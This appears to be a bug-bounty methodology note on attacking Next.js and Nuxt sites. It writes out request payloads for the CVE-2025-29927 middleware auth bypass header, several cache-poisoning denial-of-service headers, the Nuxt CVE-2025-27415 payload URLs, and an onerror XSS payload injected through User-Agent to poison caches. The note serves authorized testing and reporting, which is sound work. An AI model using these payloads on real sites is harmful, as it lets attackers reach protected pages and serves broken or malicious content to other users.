# Next.js / Nuxt

**What it is:** SSR/SSG JS frameworks with middleware auth, edge caching, and RSC data routes. Recent high-impact bugs live in the **middleware trust boundary** (auth bypass) and the **cache key** (poisoning → DoS/XSS). Low competition because they need framework-specific headers scanners don't send.

## Fingerprint
- Next.js: `x-powered-by: Next.js`, `/_next/`, `<script id="__NEXT_DATA__">` (version + buildId inside), `/_next/data/<buildId>/...`.
- Nuxt: `/_nuxt/`, `<script id="__NUXT_DATA__">`, `_payload.json`.

## Next.js middleware bypass — CVE-2025-29927
Middleware (auth/redirect/CSP/rewrite) is skipped if the request carries an internal recursion header. Affected **11.1.4–15.2.2** (fixed 15.2.3, 14.2.25).
- [ ] Detect version from `__NEXT_DATA__` / `_next` build.
- [ ] Send the header matched to the version and hit a protected route:
```
GET /dashboard/admin HTTP/1.1
x-middleware-subrequest: middleware              # 12.2–15.2.2
# or  pages/_middleware  / pages/dashboard/_middleware   (pre-12.2)
# or  middleware:middleware:middleware:middleware:middleware   (15.x recursion-depth)
```
- [ ] Bypasses: **auth/authorization redirects** (reach protected pages unauthenticated), **CSP header injection removal**, and cached error responses (DoS).

## Next.js cache poisoning (data-route / unkeyed input)
- [ ] `GET /page?__nextDataReq=1` returns JSON `pageProps` instead of HTML; if the CDN caches it, later `/page` requests serve JSON → broken page (DoS).
- [ ] Pair `__nextDataReq=1` with `x-now-route-matches: 1` → `Cache-Control: s-maxage=1, stale-while-revalidate` poisons the HTML cache key.
- [ ] Data route directly: pull `buildId` from `__NEXT_DATA__`, request `/_next/data/<buildId>/page.json` + `x-now-route-matches: 1`.
- [ ] **Unkeyed inputs reflected in SSR** (User-Agent, locale/theme cookie) → inject `<img src=x onerror=alert()>` in User-Agent + the poisoning combo → **stored-XSS-via-cache** served to all users.

## Next.js middleware CP-DoS headers
- [ ] `x-middleware-prefetch: 1` (CVE-2023-46298) → SSR page returns empty `{}`; cached → blank page DoS.
- [ ] `Rsc: 1` without the `_rsc` cache-buster → binary RSC payload cached when CDN ignores `Vary: Rsc` (Cloudflare/CloudFront/Akamai historically).
- [ ] `x-invoke-status: 200` (+ `x-invoke-error`) → error page cached as a 200.

## Nuxt cache-poisoning DoS — CVE-2025-27415
Affected Nuxt **3.0.0–3.15.2** (fixed 3.16.0).
- [ ] Lax URL regex lets a query/hash force JSON payload rendering on a cached route:
```
GET /?poc=/_payload.json
GET /#/_payload.json
```
- [ ] Server returns JSON 200; if CDN-cached, `/` serves JSON → DoS (CVSS 7.5). Re-request base route; JSON = poisoned.

## Test discipline (cache work)
- Only poison a URL nobody else needs; use a unique cache-buster param so you don't DoS real users. `Accept-Encoding: none` / unique query isolates your entry from the shared key while you confirm.
- Confirm a CDN sits in front (`cf-cache-status`, `x-vercel-cache`, `age`) and that your header is **unkeyed** (not in the cache key) before claiming poisoning.

## Impact
Auth/authorization bypass (middleware), CSP strip, cache-poisoning DoS, stored XSS via poisoned cache.

## Report notes
Pin the exact version and CVE. For the middleware bypass, show the protected resource reached with the header and 403/redirect without it. For cache poisoning, show the poisoned response served to a **second, clean** request (no attacker header) and prove the CDN cached it (`age`/`x-cache: HIT`). Don't leave a route poisoned.

## Related
`08-infra/03-cache-poisoning-and-deception.md` · `10-server-edge/03-cdn-cache-poisoning-deep.md` · `01-access-control/03-privilege-escalation.md` · `05-client-side/06-security-headers-bypass.md`
